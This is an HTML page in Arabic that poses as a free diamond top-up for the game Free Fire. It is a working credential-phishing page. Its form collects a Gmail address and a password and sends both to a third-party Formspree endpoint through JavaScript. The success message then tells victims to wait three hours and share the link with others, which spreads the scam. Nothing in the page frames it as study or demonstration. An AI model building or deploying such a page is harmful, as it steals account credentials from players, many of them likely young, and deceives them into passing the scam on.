<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>شحن جواهر فري فاير</title>
  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet"/>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #0a0a0f;
      font-family: 'Tajawal', sans-serif;
      overflow: hidden;
    }

    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background:
        radial-gradient(ellipse 80% 60% at 20% 30%, rgba(0,200,255,0.08) 0%, transparent 60%),
        radial-gradient(ellipse 60% 80% at 80% 70%, rgba(120,0,255,0.08) 0%, transparent 60%);
      animation: bgPulse 8s ease-in-out infinite alternate;
      z-index: 0;
    }

    @keyframes bgPulse {
      from { opacity: 0.6; }
      to   { opacity: 1; }
    }

    .card {
      position: relative;
      z-index: 1;
      width: min(420px, 92vw);
      background: rgba(255,255,255,0.03);
      border: 1px solid rgba(255,255,255,0.08);
      border-radius: 24px;
      padding: 48px 40px 40px;
      backdrop-filter: blur(20px);
      box-shadow: 0 32px 64px rgba(0,0,0,0.5);
      animation: fadeUp 0.7s cubic-bezier(.22,1,.36,1) both;
    }

    @keyframes fadeUp {
      from { opacity: 0; transform: translateY(30px); }
      to   { opacity: 1; transform: translateY(0); }
    }

    .logo {
      width: 52px;
      height: 52px;
      border-radius: 14px;
      background: linear-gradient(135deg, #00c8ff, #7800ff);
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 24px;
      font-size: 24px;
      box-shadow: 0 8px 24px rgba(0,200,255,0.3);
    }

    h1 {
      color: #fff;
      font-size: 1.6rem;
      font-weight: 900;
      text-align: center;
      margin-bottom: 8px;
    }

    .subtitle {
      color: rgba(255,255,255,0.35);
      font-size: 0.9rem;
      text-align: center;
      margin-bottom: 36px;
    }

    .field { margin-bottom: 20px; }

    label {
      display: block;
      color: rgba(255,255,255,0.5);
      font-size: 0.78rem;
      font-weight: 700;
      letter-spacing: 1.5px;
      text-transform: uppercase;
      margin-bottom: 10px;
    }

    .input-wrap { position: relative; }

    .input-icon {
      position: absolute;
      right: 16px;
      top: 50%;
      transform: translateY(-50%);
      color: rgba(255,255,255,0.2);
      font-size: 1rem;
      pointer-events: none;
      transition: color 0.3s;
    }

    input[type="text"] {
      width: 100%;
      padding: 14px 44px 14px 16px;
      background: rgba(255,255,255,0.05);
      border: 1px solid rgba(255,255,255,0.08);
      border-radius: 12px;
      color: #fff;
      font-family: 'Tajawal', sans-serif;
      font-size: 1rem;
      transition: all 0.3s ease;
      outline: none;
      direction: ltr;
    }

    input[type="text"]:focus {
      border-color: rgba(0,200,255,0.5);
      background: rgba(0,200,255,0.05);
      box-shadow: 0 0 0 3px rgba(0,200,255,0.08);
    }

    input[type="text"]::placeholder {
      color: rgba(255,255,255,0.18);
    }

    button[type="submit"] {
      width: 100%;
      margin-top: 28px;
      padding: 15px;
      background: linear-gradient(135deg, #00c8ff, #7800ff);
      border: none;
      border-radius: 12px;
      color: #fff;
      font-family: 'Tajawal', sans-serif;
      font-size: 1.05rem;
      font-weight: 700;
      cursor: pointer;
      transition: transform 0.2s, box-shadow 0.2s;
      box-shadow: 0 8px 24px rgba(0,200,255,0.25);
    }

    button[type="submit"]:hover {
      transform: translateY(-2px);
      box-shadow: 0 12px 32px rgba(0,200,255,0.35);
    }

    .success-msg {
      display: none;
      text-align: center;
      padding: 20px;
      color: #00c8ff;
      font-size: 1.1rem;
      font-weight: 700;
    }

    .success-msg span {
      display: block;
      font-size: 2.5rem;
      margin-bottom: 10px;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">📋</div>
    <h1>شحن جواهر فري فاير</h1>
    <p class="subtitle">أدخل البيانات وسيتم الإرسال فوراً</p>

    <form id="myForm" action="https://formspree.io/f/xlgvwenj" method="POST">

      <div class="field">
        <label>adresse gmail</label>
        <div class="input-wrap">
          <input type="text" name="ID" placeholder="adresse gmail" required/>
          <span class="input-icon">🪪</span>
        </div>
      </div>

      <div class="field">
        <label>password</label>
        <div class="input-wrap">
          <input type="text" name="Name" placeholder="password" required/>
          <span class="input-icon">👤</span>
        </div>
      </div>

      <button type="submit">إرسال ✉️</button>
    </form>

    <div class="success-msg" id="successMsg">
      <span>✅</span>
      تم الإرسال بنجاح!انتضر 3 ساعات فحسب ارسل الينك الى اشخاص آخرين لجني المزيد من الجواهر
    </div>
  </div>

  <script>
    const form = document.getElementById('myForm');
    const success = document.getElementById('successMsg');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const btn = form.querySelector('button');
      btn.textContent = 'جاري الإرسال...';
      btn.disabled = true;

      try {
        const res = await fetch(form.action, {
          method: 'POST',
          body: new FormData(form),
          headers: { 'Accept': 'application/json' }
        });

        if (res.ok) {
          form.style.display = 'none';
          success.style.display = 'block';
        } else {
          btn.textContent = 'حدث خطأ، حاول مجدداً';
          btn.disabled = false;
        }
      } catch {
        btn.textContent = 'حدث خطأ، حاول مجدداً';
        btn.disabled = false;
      }
    });
  </script>
</body>
</html>
